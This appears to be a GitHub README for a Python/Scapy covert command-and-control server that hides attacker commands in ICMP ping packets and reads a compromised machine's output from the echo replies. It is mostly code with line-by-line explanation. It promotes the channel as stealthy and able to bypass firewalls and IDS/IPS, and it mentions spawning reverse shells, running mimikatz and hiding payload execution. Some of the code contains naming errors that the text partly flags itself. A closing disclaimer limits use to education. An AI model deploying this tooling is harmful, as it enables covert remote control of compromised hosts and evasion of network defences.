![image](https://github.com/user-attachments/assets/fd255c46-2259-473e-8073-21ce49df75fb)

# Covert ICMP C2 (Command & Control) Using Python
# ICMP
✅ internet control message block.
✅ used for sending error messages and operational information about network communication.
✅ used by network devices such as router and hosts.
🔑 Key Features of ICMP :
    ❌ Error Reporting:
        ICMP informs the sender when something has gone wrong in the network.
    🛠️ Diagonstic Tools:
        used tool like ping and traceroute to test conectivity and meaure latency.
    📦🚫 Not Used for Data Transfer:
        Unlike tcp or udp ICMP doesn't carry the application-layer-data it is only reports network-related-data related.
🚨 Security Concerns:
    🌊 ICMP flood:
        A type of DOS attack using excesive ICMP request.
    💀 Ping of death:
        A large ICMP packet that crashes systems.
    🏴‍☠️ Smurf Attack:
        Uses ICMP amplification to overwhelm a target.
# Overview
This tool is uses ICMP (ping) packets for covert communication between an attacker (C2 server) and a compromised machine
(client). Since many firewalls  don't block ICMP echo Requests/Replies this can bypass security controls
✅ Attacker --> sends ICMP packets with command.
✅ Victim   --> victum executes the commands & responds with output in ICMP relay.

# 🛠️ Requirements:
    pip install scapy
# 🚀 Why these libraries are used ?
    1️⃣ scapy.all (Scapy) 🛰️
        ✅ Scapy is a powerful packet manipulation library in python.
        ✅ It allow you to capture, modify and send network packets.
        🔥 Common use cases in red teaming:
            ✅ Arp spoofing.
            ✅ DNS spoofing.
            ✅ Packet sniffing.
            ✅ ICMP covert Channels.
        🛠️ Example:
            Capturing packets 🕵️‍♂️:
                from scapy.all import sniff
                sniff(prn=lambda pkt: pkt.summary(), count=5)
    2️⃣ subprocess (system Commands) 🖥️:
        🔹 used to execute system commands from python.
        🔹 in red teaming used for.
            ✅ running os commands (ipconfig, netstat, whoami).
            ✅ execute exploits(msfconsole, nmap, mimikatz).
            ✅ spawning reverse shells 🎭.
        Example: Running whoami 🧑‍💻
            import subprocess
            result = subprocess.run(["whoami"], capture_output=True, text=True)
            print(result.stdout)
    3️⃣ OS (operating system function) ⚙️:
        🔹provide function to interact with the os.
        🔹used for.
            📂 File manipulation (os.remove, os.rename).
            🔍 Getting environment variables (os.getenv).
            📍 changing workign directories (os.chdir).
            🕵️‍♂️ hiding payload execution (os.popen).
        Example: Hiding script execution 🎭
            import os
            os.system("taskkill /F /IM notepad.exe")
# 🎯 How These Are Used Together in Red Teaming?
Imagine writing a network attack script that:
    1️⃣ Uses Scapy to sniff packets.
    2️⃣ Uses subprocess to execute system commands.
    3️⃣ Uses os to manage files or hide activities.
# 📊 Summary Table :
🕵️‍♂️ Library	Purpose in Red Teaming  
    🔹🛰️ scapy.all	Packet sniffing, ARP/DNS spoofing, covert channels
    🔹🖥️ subprocess	Running OS commands, launching exploits, spawning shells
    🔹⚙️ os	File manipulation, process management, hiding activity

# 🕵️‍♂️🚀 Explanation of the code: ICMP-Based C2 Server:
This Script implements a covert command & control (C2) server using ICMP (ping packets) to send and receive
commands from a compromised machine (victim)
# 📝 Breakdown of the Code
    1️⃣ Class Definition
       🖥️ Code:
            class ICMPserver:
                def __init__(self, victim_ip):
                    self.victim_ip = victim_ip
            🔹class ICMPserver:
                🔹 define a class to manage ICMP-based communication.
            🔹__init__(self,victim_ip):
                🔹The constructor initialize the C2 server with the target victim's ip address.
            🔹self.victim_ip = victim_ip:
                🔹Store the victim's ip for sending commands.
    2️⃣ Sending the commands (Covert ICMP packets)
       🖥️ Code:
            def send__command(self, command):
                """Sends an ICMP packet with the command"""
                packet = ip(dst=self.victim_ip) / ICMP(type=8) / Raw(load=command)
                send(packet, verbose=False)
                print(f"[+] sent command: {command}")
            📝 Explaination
            🔹def send__command(self, command):
                🔹Function to send the command via ICMP packets.
            🔹IP(dst=self.victim_ip):
                🔹Creates an ip packets with the victim's ip as the destination.
            🔹ICMP(type=8):
                🔹 Type 8 means ICMP echo requests (ping).
            🔹Raw(load=command):
                🔹Embeds the command as raw data in the packets.
            🔹send(packet, verbose=False):
                🔹sends the ICMP packets to the victim.
            🔹print(f"[+] Sent command: {command}"):
                🔹Prints the log messages confirming the commands was sent.
    3️⃣ Receiving Command Responses:
        🖥️ Code:
         def receive_response():
             def packet_callback(packet):
                 if packet.haslayer(ICMP) and packet[ICMP].type == 0:  # Type 0 means ICMP Echo Reply
                     if packet.haslayer(Raw):
                         output = packet[Raw].load.decode(errors="ignore")
                         print(f"[+] Command output:\n{output}")
                     else:
                         print("[!] Received empty response.")
             sniff(filter="icmp", prn=packet_callback, timeout=5, store=0)
        📝 Explaination
         🔹def receive_response():
             🔹Function to capture and process incoming ICMP responses.
         🔹def packet_callback(packet):
             🔹Callback function that processes sniffed packets.
         🔹if packet.haslayer(ICMP) and packet[ICMP].type == 0:
             🔹Filters only ICMP Echo Replies (Type 0 = response to a ping request).
         🔹if packet.haslayer(Raw):
             🔹 check if the packets contain raw command  output.
         🔹output = packet[Raw].load.decode(errors="ignore") 
             🔹Extract and decodes the command output.
         🔹print(f"[+] Command output:\n{output}")
             🔹Displays the captured output.
         🔹sniff(filter="icmp", prn=packet_callback, timeout=5, store=0)
             🔹sniff icmp packets on the network.
             🔹process them using packet_callback().
             🔹wait 5 seconds before stoping.
    4️⃣ Interactive Command Loop (Incorrect Placement)
        🖥️ Code:
            while True:
                cmd = input("C2 > ")
                send(IP(dst="192.168.0.108") / ICMP(type=8) / Raw(load=cmd), verbose=False)
                print(f"[+] Sent command: {cmd}")
                receive_response()
        📝 Explaination
            🔹This incorrectly creates an infinite loop at the class level (not inside start()).
            🔹cmd = input("C2 > ") → Waits for user input.
            🔹send(IP(dst="192.168.0.108") / ICMP(type=8) / Raw(load=cmd), verbose=False).
                🔹Sends an ICMP packet with the command.
            🔹receive_response() → Calls function to receive responses.
    5️⃣ The Correct start() Method:
        🖥️ Code:
            def start(self):
                """Starts the C2 interaction"""
                while True:
                    cmd = input("C2 > ")
                    if cmd.lower() in ["exit", "quit"]:
                        break
                    self.send_command(cmd)
                    self.receive_response()
        📝 Explaination
            🔹def start(self):
                🔹This function manages the C2 loop properly.
            🔹while True:
                🔹Runs indefinitely until the user exits.
            🔹cmd = input("C2 > ")
                🔹Takes input from the C2 operator.
            🔹if cmd.lower() in ["exit", "quit"]:
                🔹Exits the loop if the user types exit or quit.
            🔹self.send_command(cmd)
                🔹Calls send_command() to send the payload.
            🔹self.receive_response()
                🔹Calls receive_response() to get command output.
    6️⃣ Running the ICMP C2 Server
        🖥️ Code:
            if __name__ == "__main__":
                server = ICMPServer(victim_ip="192.168.1.50")  # Change victim IP
                server.start()
        📝 Explaination
            🔹if __name__ == "__main__":
                🔹Ensures the script runs only when executed directly.
            🔹server = ICMPServer(victim_ip="192.168.1.50")
                🔹Creates an instance of ICMPServer with the victim’s IP
            🔹server.start()
                🔹Calls start(), launching the interactive ICMP C2 session.
📌 What This Code Does?
✅ Acts as a covert C2 server using ICMP packets.
✅ Sends commands to the victim via ping packets.
✅ Receives responses using ICMP Echo Replies.
✅ Avoids detection because ICMP is often allowed in networks.

🔹 How It Works
1️⃣ Attacker runs the C2 server (icmp_c2_server.py).
2️⃣ Victim runs the listener (icmp_c2_client.py).
3️⃣ Attacker sends a command (ls, whoami, ipconfig).
4️⃣ Victim executes the command & sends back output via ICMP reply.
🔥 Why Use ICMP for C2?
✅ Stealthy – Most firewalls allow ICMP traffic
✅ No direct connection – Hard to detect & block
✅ Bypasses IDS/IPS – Looks like normal network traffic
🛑 Disclaimer:
This code is for educational and ethical hacking purposes only. Unauthorized use on systems without permission is illegal. Always perform tests in a controlled lab environment. 🚨
